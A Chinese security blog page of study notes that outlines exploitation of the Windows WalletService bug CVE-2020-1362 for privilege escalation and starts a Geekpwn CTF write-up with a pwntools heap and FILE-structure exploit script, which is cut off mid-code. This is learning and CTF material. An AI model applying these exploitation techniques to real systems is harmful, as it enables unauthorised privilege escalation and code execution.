<!DOCTYPE HTML>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    

    <title>一些CVE和其它安全相关文章阅读整理（三） | </title>
    <meta name="author" content="ssj">
    
    <meta name="description" content="7.28 – 今，ssj学习笔记。
CVE-2020-1362漏洞分析WalletService 服务是 windows 上用来持有钱包客户端所使用的对象的一个服务，只存在 windows 10 中。
CVE-2020-1362 是 WalletService 在处理 CustomProperty ">
    
    
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <meta property="og:title" content="一些CVE和其它安全相关文章阅读整理（三）">
    <meta property="og:site_name" content="ssj&#39;s blog">

    
    <meta property="og:image" content>
    

    <link rel="icon" type="image/png" href="/favicon.png">
    <link rel="alternate" href="/atom.xml" title="ssj&#39;s blog" type="application/atom+xml">
    <link rel="stylesheet" href="/css/lib/materialize.min.css">
    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">

    
        <link rel="stylesheet" href="/css/lib/tranquil-heart.css" type="text/css">
    
    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
</head>
</html>

<body>
    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">

    <nav class="pink accent-1">
    <div class="nav-wrapper">
        <a href="#" data-activates="main-menu" class="button-collapse">
            <i class="fa fa-navicon"></i>
        </a>
        <div class="">
            <a href="/" class="brand-logo hide-on-med-and-down">ssj&#39;s blog</a>
            <ul class="right hide-on-med-and-down">
                
                    <li>
                        <a class="menu-home " href="/" >
                            <i class="fa fa-home "></i>
                            
                            Home
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-archive " href="/archives" >
                            <i class="fa fa-archive "></i>
                            
                            Archives
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                            <i class="fa fa-bookmark "></i>
                            
                            Categories
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-reading " href="/reading" >
                            <i class="fa fa-book "></i>
                            
                            Reading
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-about " href="/about" >
                            <i class="fa fa-user "></i>
                            
                            About
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-search modal-trigger " href="#search" >
                            <i class="fa fa-search "></i>
                            
                            Search
                        </a>
                    </li>
                
            </ul>
            <div>
    <ul class="side-nav pink darken-1" id="main-menu">
        
        <li class="side-user">
            <div class="row">
                <div class="col s4 no-padding">
                    <img class="avatar-image circle responsive-img" src="/pingtou.jpg" alt="User Avatar">
                </div>
                <div class="info col s8 valign-wrapper no-padding">
                    <div class="valign">
                        <p class="name">ssj</p>
                        <p class="desc"></p>
                    </div>
                </div>
            </div>
        </li>
        

        
            <li class="no-padding">
                <a class="waves-effect menu-home " href="/" >
                    <i class="fa fa-home "></i>
                    
                    Home
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-archive " href="/archives" >
                    <i class="fa fa-archive "></i>
                    
                    Archives
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                    <i class="fa fa-bookmark "></i>
                    
                    Categories
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-reading " href="/reading" >
                    <i class="fa fa-book "></i>
                    
                    Reading
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-about " href="/about" >
                    <i class="fa fa-user "></i>
                    
                    About
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-search modal-trigger " href="#search" >
                    <i class="fa fa-search "></i>
                    
                    Search
                </a>
            </li>
        
    </ul>

    <ul class="side-nav pink darken-1" id="category-menu">
    

            

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/CTF/">
                    CTF <span class="right">8</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/CTF/pwn/">
                    pwn <span class="right">7</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/CTF/Android/">
                    Android <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/面试体验/">
                    面试体验 <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/面试体验/Android/">
                    Android <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Android/">
                    Android <span class="right">15</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/Android/脱壳/">
                    脱壳 <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/Android/马甲包/">
                    马甲包 <span class="right">2</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Ethereum/">
                    Ethereum <span class="right">3</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Fuzz/">
                    Fuzz <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/二进制/">
                    二进制 <span class="right">14</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/二进制/v8/">
                    v8 <span class="right">7</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/二进制/Base/">
                    Base <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/二进制/Kernel/">
                    Kernel <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/二进制/vm/">
                    vm <span class="right">2</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/二进制/iOS/">
                    iOS <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/二进制/Docs/">
                    Docs <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/CVE/">
                    CVE <span class="right">11</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/杂/">
                    杂 <span class="right">5</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/杂/听戏/">
                    听戏 <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/杂/定场诗/">
                    定场诗 <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/杂/京剧/">
                    京剧 <span class="right">3</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/基础知识/">
                    基础知识 <span class="right">2</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/基础知识/Cpp/">
                    Cpp <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/算法/">
                    算法 <span class="right">1</span></a>
                </a>
            </li>

        

    </ul>
</div>

        </div>
    </div>
</nav>

<div id="search" class="modal search-modal">
    <div class="row">
        <div class="input-field col s12">
              <input id="search-input" type="text">
              <label for="search-input">Search</label>
        </div>

    </div>
    <div id="search-result" class="search-result col s12">

    </div>
</div>


    <main>
        <div class="container main-container">
    <nav class="page-nav hide-on-small-only">
    <div class="nav-wrapper pink">
        <span class="breadcrumb">Current page(Categories)</span>
        
            
    
    
    <a class="breadcrumb" href="/categories/CVE/">CVE</a>


        

        
    </div>
</nav>

<article>
    <div class="card">
        <div class="card-content">
            

            <div class="article-title">
                
    
        <h1>一些CVE和其它安全相关文章阅读整理（三）</h1>
    


            </div>
            <time class="pink-link-context" datetime="2020-07-28T13:08:20.000Z"><a href="/2020/07/28/一些CVE和其它安全相关文章阅读整理（三）/">2020-07-28</a></time>

            <span id="busuanzi_container_page_pv" class="read-times-container">
    <i class="fa fa-eye"></i>
    <span id="busuanzi_value_page_pv"></span>
</span>

            
    <div class="tags-row">
        
            <a href="/tags/CVE/" class="chip pink lighten-1">CVE</a>
        
    </div>


            <div class="toc pink-link-context hide-on-med-and-down">
    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#CVE-2020-1362漏洞分析"><span class="section table-of-contents-text">CVE-2020-1362漏洞分析</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Geekpwn部分题解"><span class="section table-of-contents-text">Geekpwn部分题解</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#BabyPwn"><span class="section table-of-contents-text">BabyPwn</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#One-Line-JS"><span class="section table-of-contents-text">One Line JS</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#实战栈溢出：三个漏洞搞定一台路由器"><span class="section table-of-contents-text">实战栈溢出：三个漏洞搞定一台路由器</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Grubbing-Secure-Boot-the-Wrong-Way-CVE-2020-10713"><span class="section table-of-contents-text">Grubbing Secure Boot the Wrong Way: CVE-2020-10713</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#什么是GRUB"><span class="section table-of-contents-text">什么是GRUB</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#漏洞点"><span class="section table-of-contents-text">漏洞点</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#产生影响"><span class="section table-of-contents-text">产生影响</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Unpatchable-Secure-Enclave-Processor-SEP-chip-vulnerability-in-iOS"><span class="section table-of-contents-text">Unpatchable Secure Enclave Processor (SEP) chip vulnerability in iOS</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#我又来看浏览器了"><span class="section table-of-contents-text">我又来看浏览器了</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#Chromium一个洞"><span class="section table-of-contents-text">Chromium一个洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#Speculation-in-JavaScriptCore"><span class="section table-of-contents-text">Speculation in JavaScriptCore</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Issue-2035-iOS-PPL-bypass-due-to-incorrect-argument-verification-in-pmap-protect-options-internal-and-pmap-remove-options-internal"><span class="section table-of-contents-text">Issue 2035: iOS: PPL bypass due to incorrect argument verification in pmap_protect_options_internal() and pmap_remove_options_internal()</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#One-Byte-to-rule-them-all"><span class="section table-of-contents-text">One Byte to rule them all</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Technical-analysis-CVE-2020-15654-and-a-history-of-Firefox-“Browser-Lock”-bugs"><span class="section table-of-contents-text">Technical analysis: CVE-2020-15654 and a history of Firefox “Browser Lock” bugs</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Exploiting-SKYSEA-Activity-Monitor"><span class="section table-of-contents-text">Exploiting SKYSEA Activity Monitor</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#漏洞点-1"><span class="section table-of-contents-text">漏洞点</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#利用思路"><span class="section table-of-contents-text">利用思路</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Exploiting-Android-Messengers-with-WebRTC-Part-1"><span class="section table-of-contents-text">Exploiting Android Messengers with WebRTC: Part 1</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#CVE-2020-6389漏洞点分析"><span class="section table-of-contents-text">CVE-2020-6389漏洞点分析</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#CVE-2020-6387漏洞点分析"><span class="section table-of-contents-text">CVE-2020-6387漏洞点分析</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#CVE-2020-6389能利用吗"><span class="section table-of-contents-text">CVE-2020-6389能利用吗</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#绕过ASLR"><span class="section table-of-contents-text">绕过ASLR</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Exploiting-Android-Messengers-with-WebRTC-Part-2"><span class="section table-of-contents-text">Exploiting Android Messengers with WebRTC: Part 2</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#CVE-2020-6831-–-usrsctp越界读"><span class="section table-of-contents-text">CVE-2020-6831 – usrsctp越界读</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#CVE-2020-6514"><span class="section table-of-contents-text">CVE-2020-6514</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#Bug-376"><span class="section table-of-contents-text">Bug 376</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#Moving-the-Instruction-Pointer-Again"><span class="section table-of-contents-text">Moving the Instruction Pointer (Again)</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#Putting-it-All-Together"><span class="section table-of-contents-text">Putting it All Together</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#漏洞思路"><span class="section table-of-contents-text">漏洞思路</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#蹲Part3"><span class="section table-of-contents-text">蹲Part3</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Exploiting-Android-Messengers-with-WebRTC-Part-3"><span class="section table-of-contents-text">Exploiting Android Messengers with WebRTC: Part 3</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#Discussion"><span class="section table-of-contents-text">Discussion</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#CVE-2020–9854-“Unauthd”"><span class="section table-of-contents-text">CVE-2020–9854: “Unauthd”</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Fuzzing-software-advanced-tricks-Part-2"><span class="section table-of-contents-text">Fuzzing software: advanced tricks (Part 2)</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#Conclusion"><span class="section table-of-contents-text">Conclusion</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Writing-an-iOS-Kernel-Exploit-from-Scratch"><span class="section table-of-contents-text">Writing an iOS Kernel Exploit from Scratch</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#漏洞点-2"><span class="section table-of-contents-text">漏洞点</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#VirtualBox漏洞挖掘"><span class="section table-of-contents-text">VirtualBox漏洞挖掘</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#如何挖洞"><span class="section table-of-contents-text">如何挖洞</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#CVE-2019-2215-Android-Use-after-Free-in-Binder"><span class="section table-of-contents-text">CVE-2019-2215: Android Use-after-Free in Binder</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Vulnerability-Discovery-in-Open-Source-Libraries-Analyzing-CVE-2020-11863"><span class="section table-of-contents-text">Vulnerability Discovery in Open Source Libraries: Analyzing CVE-2020-11863</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#CVE-2020-9715-EXPLOITING-A-USE-AFTER-FREE-IN-ADOBE-READER"><span class="section table-of-contents-text">CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</span></a></li></ol>
</div>


            <div class="entry pink-link-context">
                <p>7.28 – 今，ssj学习笔记。</p>
<h2 id="CVE-2020-1362漏洞分析"><a href="#CVE-2020-1362漏洞分析" class="headerlink" title="CVE-2020-1362漏洞分析"></a>CVE-2020-1362漏洞分析</h2><p>WalletService 服务是 windows 上用来持有钱包客户端所使用的对象的一个服务，只存在 windows 10 中。</p>
<p>CVE-2020-1362 是 WalletService 在处理 CustomProperty 对象的过程中出现了越界读写，此漏洞可以导致攻击者获得管理员权限，漏洞评级为高危。</p>
<p>是华南理工Q4n师傅他们挖的，膜膜膜。</p>
<p>CustomProperty对象的Group的get和set没有边界检查，可以越界读写，利用思路主要如下：</p>
<ul>
<li>CustomProperty::SetLabel()修改string里的beg和end指针，可以aaw；</li>
<li>伪造虚表；</li>
<li>提权，找程序中执行LoadLibrary()的地方，改成load我们的dll，会执行DllMain()，实现提权；</li>
<li>在这里的方法是，把虚表的某个地址覆盖成dxgi.dll里的ATL::CComObject::`vector deleting destructor()，这个函数调用的LoadLibraryExW()会使用一个全局变量作为想要加载的dll的路径。</li>
</ul>
<h2 id="Geekpwn部分题解"><a href="#Geekpwn部分题解" class="headerlink" title="Geekpwn部分题解"></a>Geekpwn部分题解</h2><p><a href="https://www.anquanke.com/post/id/211602" target="_blank" rel="noopener">真·部分题解</a></p>
<h3 id="BabyPwn"><a href="#BabyPwn" class="headerlink" title="BabyPwn"></a>BabyPwn</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/</a></p>
<p>数组index可以输入负的，直接一发入魂利用stdin拿到libc_addr，然后基本就利用ctfwiki - pwn - IO_FILE Related里的知识。</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">remote_addr = <span class="string">"110.80.136.39"</span></span><br><span class="line">remote_port = <span class="number">14546</span></span><br><span class="line"></span><br><span class="line">uselibc = <span class="number">2</span> <span class="comment">#0 for no,1 for i386,2 for x64</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">haslibc = <span class="number">1</span></span><br><span class="line">atta = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">pc = <span class="string">'./chall'</span></span><br><span class="line">pwn_elf = ELF(pc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_64</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    struct = p64(_flags) + \</span><br><span class="line">            p64(_IO_read_ptr) + \</span><br><span class="line">            p64(_IO_read_end) + \</span><br><span class="line">            p64(_IO_read_base) + \</span><br><span class="line">            p64(_IO_write_base) + \</span><br><span class="line">            p64(_IO_write_ptr) + \</span><br><span class="line">            p64(_IO_write_end) + \</span><br><span class="line">            p64(_IO_buf_base) + \</span><br><span class="line">            p64(_IO_buf_end) + \</span><br><span class="line">            p64(_IO_save_base) + \</span><br><span class="line">            p64(_IO_backup_base) + \</span><br><span class="line">            p64(_IO_save_end) + \</span><br><span class="line">            p64(_IO_marker) + \</span><br><span class="line">            p64(_IO_chain) + \</span><br><span class="line">            p32(_fileno)</span><br><span class="line">    struct = struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    struct += p64(_lock)</span><br><span class="line">    struct = struct.ljust(<span class="number">0xc0</span>,<span class="string">"\x00"</span>)</span><br><span class="line">    struct += p64(_mode)</span><br><span class="line">    struct = struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> uselibc == <span class="number">2</span>:</span><br><span class="line">    context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">"i386"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> uselibc ==<span class="number">2</span> <span class="keyword">and</span> haslibc == <span class="number">0</span>:</span><br><span class="line">    libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> uselibc == <span class="number">1</span> <span class="keyword">and</span> haslibc == <span class="number">0</span>:</span><br><span class="line">        libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> haslibc:</span><br><span class="line">    <span class="comment">#p = elf.process(env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)</span></span><br><span class="line">        p = process(pc,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(pc)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">0</span>:</span><br><span class="line">    p = remote(remote_addr,remote_port)</span><br><span class="line">    <span class="keyword">if</span> haslibc:</span><br><span class="line">        libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Description:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">()</span>:</span></span><br><span 